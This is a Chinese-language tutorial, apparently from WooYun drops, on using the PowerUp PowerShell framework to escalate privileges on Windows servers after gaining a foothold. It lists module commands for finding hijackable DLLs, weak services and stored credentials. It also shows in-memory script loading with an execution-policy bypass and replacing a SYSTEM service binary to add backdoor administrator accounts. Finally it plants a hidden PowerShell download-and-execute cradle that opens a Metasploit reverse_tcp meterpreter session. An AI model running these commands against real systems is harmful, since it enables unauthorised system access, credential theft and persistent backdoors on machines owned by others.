# Powershell 提权框架-Powerup

0x00 简介
=======

* * *

通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powershell框架-Powerup，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。

0x01 使用
=======

* * *

要使用Powerup，首先需要下载此脚本:[Powerup](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)，之后加载此脚本：

```
E:> powershell.exe -nop -exec bypass
PS E:\> Import-Module .\PowerUp.psm1

```

加载完成以后，便可以使用Powerup中的所有模块了。

通过如下命令可以查看所有模块：

```
PS E:\> Get-Command -Module powerup

```

![Alt text](http://drops.javaweb.org/uploads/images/a0905c0aa9ee78bc49c0c2c8283b871c0c3f01a6.jpg)

输入可以通过tab键来自动补全，如果要查看各个模块的详细说明，可以使用"`Get-help [cmdlet] -full`"来查看，比如"`Get-Help Find-DLLHijack -full`"， 如果要将输出的结果导出到一个文件可以使用`Out-File`，如下：

```
PS E:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt

```

> 上述命令使用了Invoke-AllChecks，脚本将会进行所有的检查

在cmd环境下，可以使用下列方式来运行该脚本：

```
E:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"

```

如果你想在内存加载此脚本，可以用下列方式：

```
E:\> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfP'); Invoke-AllChecks"

```

除此之外，Metasploit上同样包含执行powershell脚本的模块[exec_powershell.rb](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/post/windows/manage/powershell/exec_powershell.rb)，通过此模块，可以通过msf会话来执行powershell。

0x02 模块介绍
=========

* * *

**Find-DLLHijack**

检查每个进程所加载的模块，返回已经加载且不在其可执行目录的模块的目录。

执行方式：

```
PS C:\> Find-DLLHijack #返回所有的dll路径
PS C:\> Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles #返回排除C:\Windows\*； C:\Program Files\*；C:\Program Files (x86)\*以外的dll路径
PS C:\> Find-DLLHijack -ExcludeOwned #返回不属于当前用户所有进程权限的dll路径

```

**Find-PathHijack**

检查当前`%PATH%`是否存在哪些目录是当前用户可以写入的。

执行方式：

```
PS C:\> Find-PathHijack

```

**Get-ApplicationHost**

从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码。

执行方式：

```
PS C:\>get-ApplicationHost
PS C:\>get-ApplicationHost | Format-Table -Autosize # 列表显示

```

**Get-ModifiableFile**

检查某个文件当前用户是否拥有修改权限，并返回有权限的文件路径。

执行方式：

```
PS C:\> '"E:\temp\123123.xlsx" -f "C:\LibAntiPrtSc_ERROR.log"' | Get-ModifiableFile

```

> 前面为文件路径

![Alt text](http://drops.javaweb.org/uploads/images/9cefe2f2451a9ae21d38c5fcac6cf34e3e660602.jpg)

**Get-RegAlwaysInstallElevated**

检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的。

执行方式：

```
PS C:\> Get-RegAlwaysInstallElevated

```

**Get-RegAutoLogon**

检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码。与msf[windows_autologin.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb)模块相同。

执行方式：

```
PS C:\> Get-RegAutoLogon

```

**Get-ServiceDetail**

返回某服务的信息。

执行方式：

```
PS C:\> Get-ServiceDetail -ServiceName Dhcp #获取DHCP服务的详细信息

```

![Alt text](http://drops.javaweb.org/uploads/images/0f84d751a6b51ee5164f91dbe7e00cd9b1c2d15b.jpg)

**Get-ServiceFilePermission**

检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的。

执行方式：

```
PS C:\> Get-ServiceFilePermission

```

![Alt text](http://drops.javaweb.org/uploads/images/7cbf1fbbea8fe718d6607a964540e9b8032d6806.jpg)

**Get-ServicePermission**

检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象。

执行方式：

```
PS C:\> Get-ServicePermission

```

**Get-ServiceUnquoted**

检查服务路径，返回包含空格但是不带引号的服务路径，类似于msf的[trusted_service_path.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb)。

此处利用的windows的一个逻辑漏洞，即当文件包含空格时，windows API会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升。

> 比如`C:\program files\hello.exe`,会被解释为`C:\program.exe`以及`C:\program files\hello.exe`

执行方式：

```
PS C:\>Get-ServiceUnquoted

```

![Alt text](http://drops.javaweb.org/uploads/images/b7a7a4730110463bab29d2c6b5e9ae338d1a1a30.jpg)

**Get-UnattendedInstallFile**

检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据。这些文件包括：

*   c:\sysprep\sysprep.xml
*   c:\sysprep\sysprep.inf
*   c:\sysprep.inf
*   c:\windows\Panther\Unattended.xml
*   c:\windows\Panther\Unattend\Unattended.xml
*   c:\windows\Panther\Unattend.xml
*   c:\windows\Panther\Unattend\Unattend.xml
*   c:\windows\System32\Sysprep\unattend.xml
*   c:\windows\System32\Sysprep\Panther\unattend.xml

执行方式：

```
PS C:\> Get-UnattendedInstallFile

```

**Get-VulnAutoRun**

检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径。

注册表检查的键值为：

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService

```

执行方式：

```
PS C:\> Get-VulnAutoRun

```

**Get-VulnSchTask**

返回当前用户能够修改的计划任务程序的名称和路径。

执行方式：

```
PS C:\> Get-VulnSchTask

```

**Get-Webconfig**

返回当前服务器上的web.config文件中的数据库连接字符串的明文。

执行方式：

```
PS C:\>get-webconfig  
PS C:\>get-webconfig | Format-Table -Autosize #列表显示

```

**Invoke-AllChecks**

执行所有的脚本来检查。

执行方式：

```
PS C:\> Invoke-AllChecks

```

![Alt text](http://drops.javaweb.org/uploads/images/db384ca17ccbe2b1fc7041f3fe5d4adb4599847e.jpg)

**Invoke-Service**

*   Invoke-ServiceDisable 禁用服务
*   Invoke-ServiceEnable 启用服务
*   Invoke-ServiceStart 启动服务
*   Invoke-ServiceStop 停止服务

执行方式为：

```
PS C:\> Invoke-ServiceDisable -ServiceName 服务名称。

```

*   Invoke-ServiceAbuse

用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令。

执行方式:

```
PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号
PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john" # 指定添加域账号
PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Administrators" # 指定添加用户，用户密码以及添加的用户组。
PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..." # 自定义执行命令

```

默认的账号可以通过修改默认参数来修改，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/213a727de205ae0be414a5e3c9ef8a67c414464f.jpg)

**Restore-ServiceBinary**

恢复服务的可执行文件到原始目录。

执行方式：

```
PS C:\> Restore-ServiceBinary -ServiceName VulnSVC

```

**Test-ServiceDaclPermission**

检查某个用户是否在一个服务有自由访问控制的权限，返回true或false。

执行方式：

```
PS C:\> Restore-ServiceBinary -ServiceName VulnSVC

```

**Write-HijackDll**

输出一个自定义命令并且能够自删除的bat文件到$env:Temp\debug.bat，并输出一个能够启动这个bat文件的dll。

执行方式：

```
PS C:\> Write-HijackDll -OutputFile 'E:\temp\test.dll' -Command 'whoami'

```

![Alt text](http://drops.javaweb.org/uploads/images/59c74d5c8e67d445c308df4f03b49df438dee876.jpg)

**Write-UserAddMSI**

生成一个安装文件，运行这个安装文件，则弹出添加用户的框。

执行方式：

```
PS C:\> Write-UserAddMSI

```

**Write-ServiceBinary**

预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令。

执行方式：

```
PS C:\> Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号
PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john" # 指定添加域账号
PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组。
PS C:\> Write-ServiceBinary -ServiceName VulnSVC -Command "net ..." # 自定义执行命令

```

**Install-ServiceBinary**

通过Write-ServiceBinary写一个C#的服务用来添加用户。

执行方式：

```
PS C:\> Install-ServiceBinary -ServiceName DHCP
PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
PS C:\> Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."

```

> `Write-ServiceBinary`与`Install-ServiceBinary`不同的是前者生成可执行文件，后者直接安装服务。

0x03 实战提权
=========

* * *

测试环境为win10。平常用的虚拟机，并没有特意去配置存在漏洞的环境，所以并不是所有的模块均可以使用。实际测试可以根据实际环境来调整。此次测试并未使用内核漏洞来提权。

首先添加低权限测试账号，使用管理员身份运行cmd，添加测试账号：

```
C:\Windows\system32>net user powerup 1 /add

```

查看powerup账号权限：

![Alt text](http://drops.javaweb.org/uploads/images/ec7aff04f8a04ee5e42b42f41bc770340ff93948.jpg)

使用powerup账号登陆系统，加载Powerup：

![Alt text](http://drops.javaweb.org/uploads/images/5559646558d1d2897ab9c880e03a8d0fb98790fb.jpg)

执行Invoke-AllChecks:

```
PS E:\> Invoke-AllChecks

```

执行以后找到下列问题：

```
[*] Checking for unquoted service paths...


ServiceName   : CDROM_Detect
Path          : C:\Program Files\4G USB Modem\4G_Eject.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'CDROM_Detect' -Path <HijackPath>

ServiceName   : hMailServer
Path          : C:\Program Files (x86)\hMailServer\Bin\hMailServer.exe RunAsService
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'hMailServer' -Path <HijackPath>

[*] Checking service executable and argument permissions...

ServiceName    : wampapache
Path           : "c:\wamp\bin\apache\apache2.2.17\bin\httpd.exe" -k runservice
ModifiableFile : c:\wamp\bin\apache\apache2.2.17\bin\httpd.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'wampapache'

ServiceName    : wampmysqld
Path           : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe wampmysqld
ModifiableFile : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'wampmysqld'

```

可以看出，Powerup列出了可能存在问题的服务，并在AbuseFunction中给了接下来的利用方式。在上面两个利用点可以看出，`unquoted service paths`中给出了两个路径带空格的文件路径，但是因为其在c盘，没有权限，所以并不能被我们利用来提权。而第二个检查通过`Get-ServiceFilePermission`找到两个当前用户可以写入相关联可执行文件的路径，我们就可以通过这个来进行提权。在AbuseFunction那里已经给了我们操作方式，接下来我们执行如下操作：

```
PS E:\> Install-ServiceBinary -ServiceName 'wampapache' -UserName rockyou -Password 123

```

![Alt text](http://drops.javaweb.org/uploads/images/5bdeae90ea9b9636a5762bd82eec40274de238e3.jpg)

之后当管理员运行该服务的时候，则会添加我们的账号，运行前：

![Alt text](http://drops.javaweb.org/uploads/images/b45ba123fd83a1ece4389bf1c2a70eb6f16452f3.jpg)

运行服务以后：

![Alt text](http://drops.javaweb.org/uploads/images/75a0f1d2e96110d8578a66d3fb3a4e0bb16e50be.jpg)

查看该账号权限：

![Alt text](http://drops.javaweb.org/uploads/images/ced5d1d1f47bd9e4a89c6c7d5b247660aed5b90c.jpg)

当然，除了添加账号，我们同样可使用msf获得meterpreter会话。

使用`web_delivery`模块开启监听：

```
msf > use exploit/multi/script/web_delivery 
msf exploit(web_delivery) > set URIPATH /
URIPATH => /
msf exploit(web_delivery) > set lport 8888
lport => 8888
msf exploit(web_delivery) > set target 2
target => 2
msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set SRVPORT 8080
SRVPORT => 8080
msf exploit(web_delivery) > set LHOST 192.168.74.1 
msf exploit(web_delivery) > exploit 

```

执行如下命令：

```
PS E:\> Install-ServiceBinary -ServiceName 'wampapache' -Command "powershell.exe -nop -w hidden -c `$m=new-object net.webclient;`$m.proxy=[Net.WebRequest]::GetSystemWebProxy();`$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX `$m.downloadstring('http://192.168.74.1:8080/');"

```

> 要注意`$`符号前面要加`来转义

当管理员运行此服务以后则获取高权限的meterpreter会话

![Alt text](http://drops.javaweb.org/uploads/images/79b5d19582747200a300847ff2167319acd23647.jpg)

提权以后，使用`Restore-ServiceBinary`恢复文件：

```
PS E:\> Restore-ServiceBinary -ServiceName 'wampapache'

```

![Alt text](http://drops.javaweb.org/uploads/images/b4ea312974363b667c51bc33ba70768de6d3546a.jpg)

可以看到，我们使用powerup成功提权了。当然碰到实际的环境可以根据不同环境不同方式来进行提权。

0x05 小结
=======

* * *

Powerup提供了一些我们并不常见的提权方式，并且为我们的Windows提权提供了极大的方便，如果碰到未安装Powershell的计算机，可以详细参考Powerup里面的函数实现过程来通过别的方式来实现同样的效果，希望本文对你有帮助。

**本文由evi1cg原创并首发于乌云drops，转载请注明**